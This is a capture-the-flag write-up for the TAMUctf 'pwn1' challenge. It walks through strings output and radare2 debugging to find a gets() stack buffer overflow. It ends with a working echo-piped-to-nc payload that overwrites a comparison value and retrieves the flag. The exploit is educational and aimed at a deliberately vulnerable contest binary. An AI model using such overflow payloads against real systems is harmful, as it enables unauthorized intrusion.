## task name
PWN1

## task description
```
nc pwn.tamuctf.com 4321

Difficulty: easy
```

[binary](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/pwn1)

## solution

Task has not much in the description, everything looks obvious.

There is a binary which runs remotely on `pwn.tamuctf.com`. Everything what comes to port `4321` it reads as input, process it and ... let's explore what it gives us as an output:

```
$ nc pwn.tamuctf.com 4321

Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
aaa
I don't know that! Auuuuuuuugh!
```

Seems my answer `aaa` to the question `What... is your name?` isn't correct.

Let's check what kind of file the `pwn1`:

```
$ file pwn1

pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

It is 32-bit elf file.

We can run the `pwn1` on 32-bit operation systems as is or we can run on 64-bit using the following instructions: [https://askubuntu.com/questions/454253/how-to-run-32-bit-app-in-ubuntu-64-bit](https://askubuntu.com/questions/454253/how-to-run-32-bit-app-in-ubuntu-64-bit)


Let's check what strings `pwn1` file has:

```
$ strings pwn1

...
UWVS
[^_]
Right. Off you go.
flag.txt
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
I don't know that! Auuuuuuuugh!
What... is your quest?
To seek the Holy Grail.
What... is my secret?
;*2$"
GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
...
```

There is a big output. I left only important part.

Now we can try to answer to some questions:

```
$ nc pwn.tamuctf.com 4321

Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
Sir Lancelot of Camelot
What... is your quest?
To seek the Holy Grail.
What... is my secret?
;*2$"
I don't know that! Auuuuuuuugh!
```

Excelent! We have answers for first two questions.

I've tried some strings as an answer to the third question - `What... is my secret?` - but vainly.

Time to uncover radare2:


```
$ r2 -b 32 -d pwn1

Process with PID 9563 started...
= attach 9563 9563
bin.baddr 0x565b6000
Using 0x565b6000
asm.bits 32
glibc.fc_offset = 0x00148
 -- You can mark an offset in visual mode with the cursor and the ',' key. Later press '.' to go back

[0xf7efea20]> s main
[0x565b6779]> V
```

The `r2 -b 32 -d pwn1` tells radare2 to debug `pwn1` as 32-bit binary.

`s main` is radare's command: seek to the main function.

`V`: switch to the visual mode.

Then press `p` two times and you'll get something like:

![s1](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s1.png)

Set breakpoint at the command just after the first `fgets` call as you can see in the above screenshoot.

To do this enter into command mode by pressing `:`, then type `db 0x5664a7f6`.

To check whether breakpoint has set type just `db`. To read a short help about each command in r2 type question mark after the command, e.g. `db?`

Then type `dc` (you should be in the command mode) to continue execution until breakpoint. Execution stops on `fgets` call. It waits for input. You'll see the first question and you can answer `Sir Lancelot of Camelot`:

![s2](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s2.png)

After answering you should hit breakpoint as you see on the above screenshoot.


Let's find next `fgets` call by scrolling down disasm code. Set breakpoint on the command just after `fgets` call (to exit command mode press Enter).

Then execute binary until breakpoint again. The answer to the second question we already know from output of `strings` command - `To seek the Holy Grail.`:

![s3](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s3.png)


Do the same: set breakpoint after third !`gets` call.
> Actually the bug is because there is `gets` call but not `fgets`. Last one allows you to copy exact number of bytes from inout to your variable. First one copy everything from input and if var is small it will override memory.

Execute the binary until breakpoint. Since we don't know the answer to the third question just put 50 `a` chars:

![s4](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s4.png)

By pressing Enter return to visual mode:

![s5](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s5.png)

We can see that on the above screenshot:

(1) next command is a simple comparison: dword from stack by address `ebp-0x10` compares to the `0xdea110c8`;

(2) next next command is `jne` - jump if not equal. We would like to not jump since the next is a call `sym.print_flag` which looks promising;

(3) also you can see a current value of the ebp registry.


What do we have by address `ebp-0x10`? Enter to command mode and print out a hex dump of 16 bytes located by `ebp-0x10`. To do it run the `x 16 @ebp-0x10`:

![s6](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s6.png)

You'll see `a` chars. Seems we have a [stack overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

> I'm not going to explain what is stack overflow, read the wiki or google by `stack buffer overflow`

Since we can override stack and put whatever we want, let's put `0xdea110c8` so `jne` will not jump and we'll get flag.

To do it we have to calculate how many `a` chars (bytes) we need to put before dword `0xdea110c8`.

Press `c` being in the visual mode and you'll jump to your stack memory. Using arrow keys go to the first `a` in your stack. It is a starting address. From this point until `ebp-0x10` we have to fill it by any bytes, then put 4 bytes - `0xdea110c8`. To get the number of bytes, or `a` chars, simply count bytes from first `a` until `ebp-0x10`.

The formula:


( value of ebp ) - ( 0x10 ) - ( address of first `a` in the stack )

In my case it is:

![s7](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s7.png)


`0xffcafd28` - `0x10` - (`0xffcafce0` + `0xD`)

The result is 43:

```
$ perl -E 'say ( (0xfff60d58 - 0x10) - (0xfff60d10 + 0xd) )'

43
```

It means we need 43 random bytes, let's say `a`, and 4 bytes `0xdea110c8`.

To generate any byte you can use `echo` with `-e` switch, e.g.:

```
$ echo -e '\x61'
a
```

So, exploit should looks like:

```
echo -e 'Sir Lancelot of Camelot\nTo seek the Holy Grail.\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xde\xa1\x10\xc8' | nc pwn.tamuctf.com 4321
```

But it doesn't work:

![s8](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s8.png)


Hm, let's run it under radare2 again, set up breakpoint just after `gets` call, and input answer for the third questions `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcde`.
> I choosed `bcde` instead of `\xde\xa1\x10\xc8` because I don't know how to input such data by hand : )

Then let's check what we have to compare:

![s9](https://github.com/c00c00r00c00/writeups/raw/master/TAMUctf/pwn1/s9.png)

- `cmp` instruction has 3 bytes size, so we do +3 and print 4 bytes of code;
- the second print takes 4 bytes of `@ebx-0x10`.

different byte order!

Let's modify our payload so last 4 bytes will be in reverse order:

```
$ echo -e 'Sir Lancelot of Camelot\nTo seek the Holy Grail.\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc8\x10\xa1\xde' |nc pwn.tamuctf.com 4321
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
gigem{34sy_CC428ECD75A0D392}

```
